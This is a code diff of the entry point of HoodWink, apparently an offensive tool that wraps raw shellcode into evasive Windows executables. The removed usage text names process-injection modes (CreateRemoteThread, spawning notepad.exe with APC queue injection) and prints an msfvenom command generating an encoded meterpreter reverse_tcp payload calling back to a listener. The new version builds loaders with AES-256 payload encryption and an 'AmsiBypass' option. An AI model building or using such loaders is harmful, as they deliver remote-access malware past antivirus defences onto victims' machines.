@@ -1,80 +1,83 @@
-﻿using HoodWink.Utils;
-using HoodWink.Services;
-using HoodWink.Models;
-using HoodWink.Modules;
-
-using System;
-using System.IO;
+﻿using HoodWink.Services;
 
 namespace HoodWink
 {
-    class Program
+    internal class Program
     {
         static void Main(string[] args)
         {
-            // Check Args
-            if (args.Length < 2)
+            if (args.Length == 0)
             {
+                Usage();
+                System.Environment.Exit(1);
+            }
+
+            string file = null;
+            string lang = null;
+            string form = null;
+            string tech = null;
+            string prot = null;
+            string extr = null;  // Will be List later
+
+            // Parse Args
+            for (int i = 0; i < args.Length; i++)
+            {
+                if (args[i] == "-file" && args.Length >= i + 1)
+                {
+                    file = args[i + 1];
+                }
+                else if (args[i] == "-lang" && args.Length >= i + 1)
+                {
+                    lang = args[i + 1];
+                }
+                else if (args[i] == "-form" && args.Length >= i + 1)
+                {
+                    form = args[i + 1];
+                }
+                else if (args[i] == "-tech" && args.Length >= i + 1)
+                {
+                    tech = args[i + 1];
+                }
+                else if (args[i] == "-prot" && args.Length >= i + 1)
+                {
+                    prot = args[i + 1];
+                }
+                else if (args[i] == "-extr" && args.Length >= i + 1)
+                {
+                    extr = args[i + 1];
+                }
+                else if (args[i] == "-showall")
+                {
+                    WinkService.PrintAllModules();
+                    System.Environment.Exit(0);
+                }
+                else if (args[i] == "-show" && args.Length >= i + 1)
+                {
+                    WinkService.PrintLanguageModules(args[i + 1]);
+                    System.Environment.Exit(0);
+                }
+            }
+
+            // Check if args set
+            if (file is null || lang is null || form is null || tech is null || prot is null || extr is null)
+            {
+                WriteService.Error("Args Error");
                 Usage();
                 System.Environment.Exit(0);
             }
 
-            // Set Args
-            string file = args[0];
-            if (!File.Exists(file))
-            {
-                WriteService.ErrorExit("Cannot find file: " + args[0]);
-            }
-
-            // Generate
-            if (args[1] == "-i")
-            {
-                // type = (int)Types.Inline;            
-                HoodWinkService.Run(file, new Inline());
-            }
-            else if (args[1] == "-t")
-            {
-                // type = (int)Types.Inline_NewThread;
-                HoodWinkService.Run(file, new Inline_NewThread());
-            }
-            else if (args[1] == "-r")
-            {
-                // type = (int)Types.Remote_CreateRemoteThread;
-                HoodWinkService.Run(file, new Remote_CreateRemoteThread());
-            }
-            else if (args[1] == "-s")
-            {
-                // type = (int)Types.Remote_Spawn_QueueAPC;
-                HoodWinkService.Run(file, new Spawn_QueueAPC());
-            }
-            else if (args[1] == "-a")
-            {
-                HoodWinkService.Run(file, new Inline());
-                HoodWinkService.Run(file, new Inline_NewThread());
-                HoodWinkService.Run(file, new Remote_CreateRemoteThread());
-                HoodWinkService.Run(file, new Spawn_QueueAPC());
-            }
-            else
-            {
-                Usage();
-            }
+            // Build
+            WinkService.BuildExe(file, lang, form, extr, prot, tech);
         }
-
         private static void Usage()
         {
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("Usage: ");
-            Console.WriteLine("  ./HoodWink.exe msf.bin -i       # for inline");
-            Console.WriteLine("  ./HoodWink.exe msf.bin -t       # for inline: CreateThread");
-            Console.WriteLine("  ./HoodWink.exe msf.bin -r       # for remote: CreateRemoteThread via given PID");
-            Console.WriteLine("  ./HoodWink.exe msf.bin -s       # for remote: Spawn notepad.exe and Queue APC inject");
-            Console.WriteLine("  ./HoodWink.exe msf.bin -a       # makes all of the above");
-            Console.WriteLine("Payload Examples: ");
-            Console.WriteLine("   msfbin: msfvenom -p windows/x64/exec -f raw CMD=calc.exe -o msf.bin");
-            Console.WriteLine("   msfbin: msfvenom -p windows/x64/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 LHOST=192.168.159.138 LPORT=8080 -f raw -o msf.bin");
-            Console.ResetColor();
-
-            System.Environment.Exit(0);
+            WriteService.Header("Show Modules: ");
+            WriteService.Info(@"    .\HoodWink.exe  -showall        Show all Modules");
+            WriteService.Info(@"    .\HoodWink.exe  -show <lang>    Show Modules for Lang");
+            WriteService.Header("Syntax: ");
+            WriteService.Info(@"    .\HoodWink.exe -file <name> -lang <name> -form <name> -extr <name> -prot <name> -tech <name> ");
+            WriteService.Header("Example: ");
+            WriteService.Info(@"    .\HoodWink.exe -file C:\Payloads\msf.bin -lang Csharp -form Exe -extr AmsiBypass -prot Aes256 -tech Spawn_QueueApc");
         }
     }
 }
